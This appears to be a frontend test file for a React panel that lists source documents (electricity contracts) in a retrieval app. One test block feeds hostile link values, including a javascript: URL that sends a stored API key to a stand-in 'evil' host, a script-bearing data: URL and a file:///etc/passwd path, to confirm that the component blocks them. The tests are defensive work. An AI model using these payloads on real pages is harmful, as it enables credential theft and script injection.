import { render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { describe, expect, it, vi } from "vitest";
import type { SourceRef } from "../types";
import { SourcesPanel } from "./SourcesPanel";

function source(n: number, extra: Partial<SourceRef> = {}): SourceRef {
  return {
    n,
    source_file: `contrato-${n}.md`,
    doc_id: `doc-${n}`,
    section: null,
    page_start: null,
    page_end: null,
    usuario_libre: null,
    suministrador: null,
    fecha_suscripcion: null,
    tipo: null,
    source_url: null,
    snippet: "fragmento",
    ...extra,
  };
}

describe("SourcesPanel", () => {
  it("no renderiza nada sin fuentes", () => {
    const { container } = render(
      <SourcesPanel sources={[]} highlighted={null} onClose={() => {}} />,
    );
    expect(container).toBeEmptyDOMElement();
  });

  it("lista una tarjeta por fuente", () => {
    render(
      <SourcesPanel sources={[source(1), source(2)]} highlighted={null} onClose={() => {}} />,
    );
    expect(screen.getByText("contrato-1.md")).toBeInTheDocument();
    expect(screen.getByText("contrato-2.md")).toBeInTheDocument();
  });

  it("resalta solo la fuente indicada", () => {
    const { container } = render(
      <SourcesPanel sources={[source(1), source(2)]} highlighted={2} onClose={() => {}} />,
    );
    expect(container.querySelector("#source-2")?.className).toContain("highlighted");
    expect(container.querySelector("#source-1")?.className).not.toContain("highlighted");
  });

  it("muestra un rango de páginas solo cuando difiere de la inicial", () => {
    const { container } = render(
      <SourcesPanel
        sources={[source(1, { page_start: 3, page_end: 5 }), source(2, { page_start: 7, page_end: 7 })]}
        highlighted={null}
        onClose={() => {}}
      />,
    );
    expect(container.querySelector("#source-1")?.textContent).toContain("pág. 3–5");
    expect(container.querySelector("#source-2")?.textContent).toContain("pág. 7");
    expect(container.querySelector("#source-2")?.textContent).not.toContain("–");
  });

  it("renderiza la metadata disponible y omite la ausente", () => {
    render(
      <SourcesPanel
        sources={[source(1, { usuario_libre: "ACME S.A.", tipo: "contrato" })]}
        highlighted={null}
        onClose={() => {}}
      />,
    );
    expect(screen.getByText("ACME S.A.")).toBeInTheDocument();
    expect(screen.getByText("contrato")).toBeInTheDocument();
    expect(screen.queryByText("Suministrador")).not.toBeInTheDocument();
  });

  it("enlaza el PDF original con rel seguro", () => {
    render(
      <SourcesPanel
        sources={[source(1, { source_url: "https://osinergmin.gob.pe/a.pdf" })]}
        highlighted={null}
        onClose={() => {}}
      />,
    );
    const link = screen.getByRole("link");
    expect(link).toHaveAttribute("href", "https://osinergmin.gob.pe/a.pdf");
    expect(link).toHaveAttribute("rel", expect.stringContaining("noreferrer"));
    expect(link).toHaveAttribute("target", "_blank");
  });

  it("invoca onClose al pulsar el botón de cierre", async () => {
    const onClose = vi.fn();
    render(<SourcesPanel sources={[source(1)]} highlighted={null} onClose={onClose} />);
    await userEvent.click(screen.getByRole("button", { name: "Cerrar panel" }));
    expect(onClose).toHaveBeenCalledOnce();
  });
});

describe("SourcesPanel: esquemas de URL", () => {
  it.each([
    "javascript:fetch('https://evil/'+localStorage.getItem('sein-rag-api-key'))",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "file:///etc/passwd",
  ])("no renderiza un enlace con esquema %s", (url) => {
    render(
      <SourcesPanel sources={[source(1, { source_url: url })]} highlighted={null} onClose={() => {}} />,
    );
    expect(screen.queryByRole("link")).not.toBeInTheDocument();
  });

  it("sí renderiza http y https", () => {
    render(
      <SourcesPanel
        sources={[source(1, { source_url: "https://www.osinergmin.gob.pe/a.pdf" })]}
        highlighted={null}
        onClose={() => {}}
      />,
    );
    expect(screen.getByRole("link")).toHaveAttribute(
      "href",
      "https://www.osinergmin.gob.pe/a.pdf",
    );
  });

  it("un source_url basura no rompe el panel", () => {
    render(
      <SourcesPanel
        sources={[source(1, { source_url: "no es una url" })]}
        highlighted={null}
        onClose={() => {}}
      />,
    );
    expect(screen.getByText("contrato-1.md")).toBeInTheDocument();
  });
});
